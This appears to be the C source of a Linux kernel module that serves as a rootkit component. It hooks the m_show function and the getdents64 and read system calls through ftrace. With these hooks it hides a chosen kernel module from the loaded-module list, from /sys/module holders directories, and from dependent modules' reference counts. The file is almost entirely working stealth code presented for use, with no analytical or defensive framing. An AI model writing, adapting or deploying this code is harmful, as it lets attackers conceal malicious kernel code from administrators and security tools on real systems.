#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/ftrace.h>
#include <net/inet_sock.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <stdbool.h>
#include "../common/ftrace_hooking/ftrace_hook.h"

static char *mod_name_to_hide;
module_param(mod_name_to_hide, charp, 0600);
static char *sys_modules_path = "/sys/module/";

#pragma region hook_consts
// get_dents64 hook
typedef int (*original_getdents64_t)(const struct pt_regs *regs);
static struct fthook getdents64_hook;
static char *holders_path = "/holders";

// read hook
typedef ssize_t  (*original_read_t)(const struct pt_regs *regs);
static struct fthook read_hook;
static char *refcount_path = "/refcnt";

// m_show hook
typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
static struct fthook m_show_hook;
#pragma endregion hook_consts

#pragma region utils
/* Does a already use b?
   Copied from module.c, as that function is not exported. */
bool already_uses(struct module *a, struct module *b)
{
	struct module_use *use;

	list_for_each_entry(use, &b->source_list, source_list) {
		if (use->source == a) {
			return true;
		}
	}
    
	return false;
}
#pragma endregion utils

#pragma region read_hook
ssize_t new_read(const struct pt_regs *regs) {
    original_read_t original_read_ptr = (original_read_t)read_hook.original_function_address;

    int bytes_read = original_read_ptr(regs);
    struct file *file = fget((int)regs->di);
    if (file == NULL) {
        return bytes_read;
    }

    char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
    char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
        
    if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
        char *current_module_name = file->f_path.dentry->d_parent->d_iname;

        // This isn't intended to work on the module we're trying to hide, so we skip it.
        if (strcmp(mod_name_to_hide, current_module_name)) {
            mutex_lock(&module_mutex);
            struct module *module_to_hide = find_module(mod_name_to_hide);
            struct module *current_module = find_module(current_module_name);
            mutex_unlock(&module_mutex);

            int does_use_hidden_module = already_uses(module_to_hide, current_module);
            if (does_use_hidden_module) {
                pr_info("Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);

                int refcount = module_refcount(current_module);
                if (refcount > 0) {
                    int new_refcount = refcount - 1;

                    void *buf_pointer = (void*)regs->si;
                    char *new_value = kmalloc(bytes_read, GFP_KERNEL);
                    sprintf(new_value, "%d\n", new_refcount);
                    copy_to_user(buf_pointer, new_value, bytes_read);
                    kfree(new_value);
                }
            }
        }
    }
    
    kfree(allocated_path_pointer);
    fput(file);
    return bytes_read;
}
#pragma endregion read_hook

#pragma region get_dents64_hook
int new_getdents64(const struct pt_regs *regs) {
    original_getdents64_t original_getdents64_ptr = (original_getdents64_t)getdents64_hook.original_function_address;
    int total_bytes_read = original_getdents64_ptr(regs);

    if (total_bytes_read > 0) {
        struct linux_dirent64 *buf_pointer = (struct linux_dirent64*)regs->si;
        struct linux_dirent64 *first = kmalloc(total_bytes_read, GFP_KERNEL);

        int copy_res = copy_from_user(first, buf_pointer, (unsigned long)total_bytes_read);
        if (copy_res) {
            pr_warn("Error while copying from user space! error %d", copy_res);
            return total_bytes_read;
        }

        struct linux_dirent64 *curr = first;

        int bytes_left = total_bytes_read;
        bool has_been_found = false;
        while (bytes_left > 0) { 
            bytes_left -= curr->d_reclen;
            curr = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);

            struct file *file = fget((int)regs->di);
            if (file == NULL) {
                continue;
            }

            char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
            char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);

            if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, holders_path) != NULL) && (!strcmp(curr->d_name, mod_name_to_hide))) {
                pr_info("Hiding %s from %s using get_dents64", mod_name_to_hide, path);    
                has_been_found = true;

                // Array will be shortened by the length of the member we will delete.
                total_bytes_read -= curr->d_reclen;
                bytes_left -= curr->d_reclen;
                
                struct linux_dirent64 *next_pos = (struct linux_dirent64*)(((char*)curr) + curr->d_reclen);
                memmove(curr, next_pos, bytes_left);
            }

            kfree(allocated_path_pointer);
            fput(file);
        }
        
        if (has_been_found) {
            copy_to_user(buf_pointer, first, total_bytes_read);
        }

        kfree(first);
    }

    return total_bytes_read;
}
#pragma endregion get_dents64_hook

#pragma region m_show_hook
int new_m_show(struct seq_file *m, void *p) {
    original_m_show_t original_m_show_ptr = (original_m_show_t)m_show_hook.original_function_address;

    struct module *mod = list_entry(p, struct module, list);
    if (!strcmp(mod->name, mod_name_to_hide)) {
        pr_info("Hiding %s from m_show", mod->name);
        return 0;
    }

    return original_m_show_ptr(m, p);
}
#pragma endregion m_show_hook

int load(void) {
    pr_info("Initializing...");
    if (mod_name_to_hide == NULL) {
        pr_warn("Mod name to hide has not been set! Exiting...");
        return -EINVAL;
    }

    int m_show_res = setup_kernel_func_hook(&m_show_hook, "m_show", (unsigned long)new_m_show);
    if (m_show_res) {
        return m_show_res;
    }

    int getdents_res = setup_syscall_hook(&getdents64_hook,__NR_getdents64, (unsigned long)new_getdents64);
    if (getdents_res) {
        return getdents_res;
    }

    int read_res = setup_syscall_hook(&read_hook, __NR_read, (unsigned long)new_read);
    if (read_res) {
        return read_res;
    }

    pr_info("Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    pr_info("Shutting down.");

    remove_hook(&m_show_hook);
    remove_hook(&getdents64_hook);
    remove_hook(&read_hook);

    pr_info("Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");